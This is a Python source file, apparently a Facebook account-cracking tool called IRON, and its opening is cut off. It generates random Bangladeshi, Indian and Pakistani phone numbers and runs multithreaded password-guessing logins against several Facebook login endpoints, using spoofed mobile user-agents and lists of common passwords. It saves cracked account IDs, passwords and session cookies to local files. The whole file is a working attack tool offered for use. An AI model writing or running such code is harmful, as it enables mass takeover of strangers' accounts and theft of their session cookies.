    ____line____();____see____(f"{red}[{green}A{red}]{green} RANDOM BD {red}~  {red}[{green}B{red}]{green} RANDOM IND {red}~ {red}[{green}C{red}]{green} RANDOM PK {red}~ ");____line____();____Rand____ = input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ");____line____()
    if ____Rand____ in ['a','A','1','01']:
        rand_bd()
    elif ____Rand____ in ['b','B','2','02']:
        rand_ind()
    elif ____Rand____ in ["C","c","3","Three"]:
        rand_pk()
    else:
        time.sleep(1);____see____(f"{red}[{green}!{red}]{green} ERROR OPTION {red}~");time.sleep(2);return ____main____()

def rand_bd():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    ____see____(f"{red}[{green}!{red}]{green} BD CODE {red}~{green} 017 {red}~{green} 019{red} ~{green} 018 {red}~{green} 016 {red}~{green} 013 {red}~{green} 014 {red}~");____line____()
    try:code = input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ")
    except:code='017'
    ____line____()
    ____see____(f"{red}[{green}!{red}]{green} LIMIT {red}~{green} 1000 {red}~{green} 3000{red} ~{green} 5000 {red}~{green} 7000 {red}~{green} 9000 {red}~");____line____()
    try:limit = int(input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} "))
    except:limit=5000
    ____line____()
    ____see____(f"{red}[{green}!{red}]{green} METHOD {red}~{green} A {red}~{green} B{red} ~{green} C {red}~{green} D {red}~");____line____()
    ___method___=input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ")
    if ___method___ in ["A","a","1","One"]:mthd.append("A")
    elif ___method___ in ["B","b","2","Two"]:mthd.append("B")
    elif ___method___ in ["C","c","3","Three"]:mthd.append("C")
    else:mthd.append("D")
    ____line____();____see____(f"{red}[{green}!{red}]{green} SHOW COOKIE {red}~{green} Y {red}~{green} N{red} ~");____line____();cko=input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ");____line____()
    if cko in ['N','n','No','na','Na','2']:cki.append('N')
    else:cki.append('Y')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as culex:

        def ____cls____():os.system('clear');print(f""" \033[1;91m┏{green}              \033[1;91m┓\n \033[1;91m┃{green}  ███    ███  \033[1;91m┃  {green}AUTHOR  \033[1;91m: {green}MARUFUL HAQUE MUHIB \n \033[1;91m┃{green}  ████  ████  \033[1;91m┃  {green}GITHUB  \033[1;91m:{green} MUHIB-143\n \033[1;91m┃{green}  ██ ████ ██  \033[1;91m┃  {green}TOOL    \033[1;91m:{green} IRON\033[1;91m |{green} {___vers___}\n \033[1;91m┃{green}  ██  ██  ██  \033[1;91m┃  {green}YOU GOT \033[1;91m:{green} FILE \033[1;91m |{green} RANDOM\n \033[1;91m┃{green}  ██      ██  \033[1;91m┃  {green}ARCH    \033[1;91m:{green} {__import__('platform').machine()}\033[1;91m |{green} {__import__('platform').architecture()[0]}\n \033[1;91m┗{green}              \033[1;91m┛""");____line____()
        ____cls____()
        tl = str(len(user))
        print(f'{red}[{green}!{red}]{green} ACCOUNTS {red}~{green} {tl} {red}~{green} METHOD {red}~{green} {rc(mthd)} {red}~{green} CODE {red}~{green} {code} {red}~')
        print(f"{red}[{green}!{red}]{green} IF NO RESULT TURN {red}~\033[1;93mOn{red}~\033[1;93mOff{red}~{green} AIRPLANE MODE {red}~")
        ____line____()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'১২৩৪৫৬','i love you','sabbir','Hussain','jannat','ashraful','bangla','valobashi','password','sumaiya','ronaldo','jannatul','humaira','cutegirl']
            ids = code+love
            if 'A' in mthd:
                culex.submit(______RandM1______,ids,pwx,tl)
            elif 'B' in mthd:
                culex.submit(______RandM2______,ids,pwx,tl)
            elif 'C' in mthd:
                culex.submit(______RandM3______,ids,pwx,tl)
            else:
                culex.submit(______RandM4______,ids,pwx,tl)
    print('\n');____line____();print(f"{red}[{green}!{red}]{green} CRACKING WAS COMPLETED {red}~")
    print(f'{red}[{green}!{red}]{green} TOTAL OK ID {red}~{green} '+str(len(oks)));____line____();input();time.sleep(5);exit()

def rand_ind():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    ____see____(f"{red}[{green}!{red}]{green} IND CODE {red}~{green} 620 {red}~{green} 639{red} ~{green} 721 {red}~{green} 710 {red}~{green} 613 {red}~{green} 752 {red}~");____line____()
    try:code = input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ")
    except:code='017'
    ____line____()
    ____see____(f"{red}[{green}!{red}]{green} LIMIT {red}~{green} 1000 {red}~{green} 3000{red} ~{green} 5000 {red}~{green} 7000 {red}~{green} 9000 {red}~");____line____()
    try:limit = int(input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} "))
    except:limit=5000
    ____line____()
    ____see____(f"{red}[{green}!{red}]{green} METHOD {red}~{green} A {red}~{green} B{red} ~{green} C {red}~{green} D {red}~");____line____()
    ___method___=input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ")
    if ___method___ in ["A","a","1","One"]:mthd.append("A")
    elif ___method___ in ["B","b","2","Two"]:mthd.append("B")
    elif ___method___ in ["C","c","3","Three"]:mthd.append("C")
    else:mthd.append("D")
    ____line____();____see____(f"{red}[{green}!{red}]{green} SHOW COOKIE {red}~{green} Y {red}~{green} N{red} ~");____line____();cko=input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ");____line____()
    if cko in ['N','n','No','na','Na','2']:cki.append('N')
    else:cki.append('Y')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as culex:

        def ____cls____():os.system('clear');print(f""" \033[1;91m┏{green}              \033[1;91m┓\n \033[1;91m┃{green}  ███    ███  \033[1;91m┃  {green}AUTHOR  \033[1;91m: {green}MARUFUL HAQUE MUHIB \n \033[1;91m┃{green}  ████  ████  \033[1;91m┃  {green}GITHUB  \033[1;91m:{green} MUHIB-143\n \033[1;91m┃{green}  ██ ████ ██  \033[1;91m┃  {green}TOOL    \033[1;91m:{green} IRON\033[1;91m |{green} {___vers___}\n \033[1;91m┃{green}  ██  ██  ██  \033[1;91m┃  {green}YOU GOT \033[1;91m:{green} FILE \033[1;91m |{green} RANDOM\n \033[1;91m┃{green}  ██      ██  \033[1;91m┃  {green}ARCH    \033[1;91m:{green} {__import__('platform').machine()}\033[1;91m |{green} {__import__('platform').architecture()[0]}\n \033[1;91m┗{green}              \033[1;91m┛""");____line____()
        ____cls____()
        tl = str(len(user))
        print(f'{red}[{green}!{red}]{green} ACCOUNTS {red}~{green} {tl} {red}~{green} METHOD {red}~{green} {rc(mthd)} {red}~{green} CODE {red}~{green} {code} {red}~')
        print(f"{red}[{green}!{red}]{green} IF NO RESULT TURN {red}~\033[1;93mOn{red}~\033[1;93mOff{red}~{green} AIRPLANE MODE {red}~")
        ____line____()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'57273200','59039200','57575751','57575752','sangma','indian']
            ids = '+91'+code+love
            if 'A' in mthd:
                culex.submit(______RandM1______,ids,pwx,tl)
            elif 'B' in mthd:
                culex.submit(______RandM2______,ids,pwx,tl)
            elif 'C' in mthd:
                culex.submit(______RandM3______,ids,pwx,tl)
            else:
                culex.submit(______RandM4______,ids,pwx,tl)
    print('\n');____line____();print(f"{red}[{green}!{red}]{green} CRACKING WAS COMPLETED {red}~")
    print(f'{red}[{green}!{red}]{green} TOTAL OK ID {red}~{green} '+str(len(oks)));____line____();input();time.sleep(5);exit()

def rand_pk():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    ____see____(f"{red}[{green}!{red}]{green} PK CODE {red}~{green} 061 {red}~{green} 158{red} ~{green} 416 {red}~{green} 264 {red}~{green} 652 {red}~{green} 352 {red}~");____line____()
    try:code = input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ")
    except:code='017'
    ____line____()
    ____see____(f"{red}[{green}!{red}]{green} LIMIT {red}~{green} 1000 {red}~{green} 3000{red} ~{green} 5000 {red}~{green} 7000 {red}~{green} 9000 {red}~");____line____()
    try:limit = int(input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} "))
    except:limit=5000
    ____line____()
    ____see____(f"{red}[{green}!{red}]{green} METHOD {red}~{green} A {red}~{green} B{red} ~{green} C {red}~{green} D {red}~");____line____()
    ___method___=input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ")
    if ___method___ in ["A","a","1","One"]:mthd.append("A")
    elif ___method___ in ["B","b","2","Two"]:mthd.append("B")
    elif ___method___ in ["C","c","3","Three"]:mthd.append("C")
    else:mthd.append("D")
    ____line____();____see____(f"{red}[{green}!{red}]{green} SHOW COOKIE {red}~{green} Y {red}~{green} N{red} ~");____line____();cko=input(f"{red}[{green}!{red}]{green} CHOICE OPTION {red}~{green} ");____line____()
    if cko in ['N','n','No','na','Na','2']:cki.append('N')
    else:cki.append('Y')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as culex:

        def ____cls____():os.system('clear');print(f""" \033[1;91m┏{green}              \033[1;91m┓\n \033[1;91m┃{green}  ███    ███  \033[1;91m┃  {green}AUTHOR  \033[1;91m: {green}MARUFUL HAQUE MUHIB \n \033[1;91m┃{green}  ████  ████  \033[1;91m┃  {green}GITHUB  \033[1;91m:{green} MUHIB-143\n \033[1;91m┃{green}  ██ ████ ██  \033[1;91m┃  {green}TOOL    \033[1;91m:{green} IRON\033[1;91m |{green} {___vers___}\n \033[1;91m┃{green}  ██  ██  ██  \033[1;91m┃  {green}YOU GOT \033[1;91m:{green} FILE \033[1;91m |{green} RANDOM\n \033[1;91m┃{green}  ██      ██  \033[1;91m┃  {green}ARCH    \033[1;91m:{green} {__import__('platform').machine()}\033[1;91m |{green} {__import__('platform').architecture()[0]}\n \033[1;91m┗{green}              \033[1;91m┛""");____line____()
        ____cls____()
        tl = str(len(user))
        print(f'{red}[{green}!{red}]{green} ACCOUNTS {red}~{green} {tl} {red}~{green} METHOD {red}~{green} {rc(mthd)} {red}~{green} CODE {red}~{green} {code} {red}~')
        print(f"{red}[{green}!{red}]{green} IF NO RESULT TURN {red}~\033[1;93mOn{red}~\033[1;93mOff{red}~{green} AIRPLANE MODE {red}~")
        ____line____()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'khankhan','khan1122','khan12345','khan123','khanbaba','pakistan','khanzada','malik123','kingkhan','alikhan','janjan','pak123','pubg123']
            ids = '03'+code+love
            if 'A' in mthd:
                culex.submit(______RandM1______,ids,pwx,tl)
            elif 'B' in mthd:
                culex.submit(______RandM2______,ids,pwx,tl)
            elif 'C' in mthd:
                culex.submit(______RandM3______,ids,pwx,tl)
            else:
                culex.submit(______RandM4______,ids,pwx,tl)
    print('\n');____line____();print(f"{red}[{green}!{red}]{green} CRACKING WAS COMPLETED {red}~")
    print(f'{red}[{green}!{red}]{green} TOTAL OK ID {red}~{green} '+str(len(oks)));____line____();input();time.sleep(5);exit()

def ua_valid():
    rr = random.randint
    rc = random.choice
    version = random.choice(["6","7","8","9","10","12","13","14"])
    model_list = ["Redmi Note 8", "Samsung Galaxy A10", "Oppo A5", "Vivo Y12", "Realme C2", 
                  "Huawei Y6", "Infinix Hot 8", "Tecno Spark 4", "Nokia 5.3", "Motorola G8"]
    model = random.choice(model_list)
    build = random.choice(["SP1A.210812.016","UKQ1.230804.001","SKQ1.220303.001","TKQ1.221114.001",
                          "TKQ1.220829.002","TP1A.220624.014","TKQ1.220905.001","QKQ1.190828.002"])
    redmi4 = f"Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36"
    return rc([redmi4])

def ______RandM1______(ids,pwx,tl):
    global loop,oks,cps,twf
    for i in range(12):
        time.sleep(0.1)
        sys.stdout.write(f'\r\r{red}[{green}' + animation[i % len(animation)] +f'{red}] ~ [{green}{loop}{red}] ~ [{green}M1{red}] ~ [{green}{len(oks)}{red}] ');sys.stdout.flush()
    ua = ua_valid()
    session = __import__("requests").Session()
    try:
        for pas in pwx:
            free_fb = session.get('https://free.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 
            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            'email': ids, 
            'pass': pas,
            'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),
            'login_source': 'comet_headerless_login',
            'next': '',
            'try_number': '0',
            'unrecognized_tries': '0',
            'prefill_source': 'browser_dropdown',
            'prefill_type': 'contact_point',
            'first_prefill_source': 'browser_dropdown',
            'first_prefill_type': 'contact_point',
            'had_cp_prefilled': 'true',
            'had_password_prefilled': 'false',
            'is_smart_lock': 'false',
            '__dyn': '',
            '__csr': '',
            '__req': '',
            '__a': '',
            '__user': '0'
            }
            update={
            'User-Agent': ua, 
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.facebook.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.facebook.com',
            'Alt-Used': 'www.facebook.com',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream',
            }
            session.post(url=f"https://www.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f'\r\r{red}[{green}ACTIVE{red}]{green} {cid} {red}~{green} {pas}')
                    oks.append(ids)
                    if 'Y' in cki:
                        print(f"{red}[{green}COOKIE{red}]{green} {coki}\n")
                    open('/sdcard/MUHIB/MUHIB-RANDOM-M1.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

def ______RandM2______(ids,pwx,tl):
    global loop,oks,cps,twf
    for i in range(12):
        time.sleep(0.1)
        sys.stdout.write(f'\r\r{red}[{green}' + animation[i % len(animation)] +f'{red}] ~ [{green}{loop}{red}] ~ [{green}M2{red}] ~ [{green}{len(oks)}{red}] ');sys.stdout.flush()
    ua = ua_valid()
    session = __import__("requests").Session()
    try:
        for pas in pwx:
            free_fb = session.get('https://free.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 
            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            'email': ids, 
            'pass': pas,
            'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),
            'login_source': 'comet_headerless_login',
            'next': '',
            'try_number': '0',
            'unrecognized_tries': '0',
            'prefill_source': 'browser_dropdown',
            'prefill_type': 'contact_point',
            'first_prefill_source': 'browser_dropdown',
            'first_prefill_type': 'contact_point',
            'had_cp_prefilled': 'true',
            'had_password_prefilled': 'false',
            'is_smart_lock': 'false',
            '__dyn': '',
            '__csr': '',
            '__req': '',
            '__a': '',
            '__user': '0'
            }
            update={
            'User-Agent': ua, 
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.facebook.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.facebook.com',
            'Alt-Used': 'www.facebook.com',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream',
            }
            session.post(url=f"https://mbasic.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f'\r\r{red}[{green}ACTIVE{red}]{green} {cid} {red}~{green} {pas}')
                    oks.append(ids)
                    if 'Y' in cki:
                        print(f"{red}[{green}COOKIE{red}]{green} {coki}\n")
                    open('/sdcard/MUHIB/MUHIB-RANDOM-M2.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

def ______RandM3______(ids,pwx,tl):
    global loop,oks,cps,twf
    for i in range(12):
        time.sleep(0.1)
        sys.stdout.write(f'\r\r{red}[{green}' + animation[i % len(animation)] +f'{red}] ~ [{green}{loop}{red}] ~ [{green}M3{red}] ~ [{green}{len(oks)}{red}] ');sys.stdout.flush()
    ua = ua_valid()
    session = __import__("requests").Session()
    try:
        for pas in pwx:
            free_fb = session.get('https://free.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 
            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            'email': ids, 
            'pass': pas,
            'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),
            'login_source': 'comet_headerless_login',
            'next': '',
            'try_number': '0',
            'unrecognized_tries': '0',
            'prefill_source': 'browser_dropdown',
            'prefill_type': 'contact_point',
            'first_prefill_source': 'browser_dropdown',
            'first_prefill_type': 'contact_point',
            'had_cp_prefilled': 'true',
            'had_password_prefilled': 'false',
            'is_smart_lock': 'false',
            '__dyn': '',
            '__csr': '',
            '__req': '',
            '__a': '',
            '__user': '0'
            }
            update={
            'User-Agent': ua, 
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.facebook.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.facebook.com',
            'Alt-Used': 'www.facebook.com',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream',
            }
            session.post(url=f"https://web.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f'\r\r{red}[{green}ACTIVE{red}]{green} {cid} {red}~{green} {pas}')
                    oks.append(ids)
                    if 'Y' in cki:
                        print(f"{red}[{green}COOKIE{red}]{green} {coki}\n")
                    open('/sdcard/MUHIB/MUHIB-RANDOM-M3.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

def ______RandM4______(ids,pwx,tl):
    global loop,oks,cps,twf
    for i in range(12):
        time.sleep(0.1)
        sys.stdout.write(f'\r\r{red}[{green}' + animation[i % len(animation)] +f'{red}] ~ [{green}{loop}{red}] ~ [{green}M4{red}] ~ [{green}{len(oks)}{red}] ');sys.stdout.flush()
    ua = ua_valid()
    session = __import__("requests").Session()
    try:
        for pas in pwx:
            free_fb = session.get('https://free.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 
            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            'email': ids, 
            'pass': pas,
            'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),
            'login_source': 'comet_headerless_login',
            'next': '',
            'try_number': '0',
            'unrecognized_tries': '0',
            'prefill_source': 'browser_dropdown',
            'prefill_type': 'contact_point',
            'first_prefill_source': 'browser_dropdown',
            'first_prefill_type': 'contact_point',
            'had_cp_prefilled': 'true',
            'had_password_prefilled': 'false',
            'is_smart_lock': 'false',
            '__dyn': '',
            '__csr': '',
            '__req': '',
            '__a': '',
            '__user': '0'
            }
            update={
            'User-Agent': ua, 
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.facebook.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.facebook.com',
            'Alt-Used': 'www.facebook.com',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream',
            }
            session.post(url=f"https://free.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f'\r\r{red}[{green}ACTIVE{red}]{green} {cid} {red}~{green} {pas}')
                    oks.append(ids)
                    if 'Y' in cki:
                        print(f"{red}[{green}COOKIE{red}]{green} {coki}\n")
                    open('/sdcard/MUHIB/MUHIB-RANDOM-M4.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

if __name__=='__main__':
    try:
        ____main____()
    except requests.exceptions.ConnectionError:
        print('\n NETWORK ERROR')
        exit()
    except KeyboardInterrupt:
        print(f'\n{red}[!] Process interrupted by user')
        exit()
    except Exception as e:
        print(f'\n{red}[!] Error: {e}')
        exit()
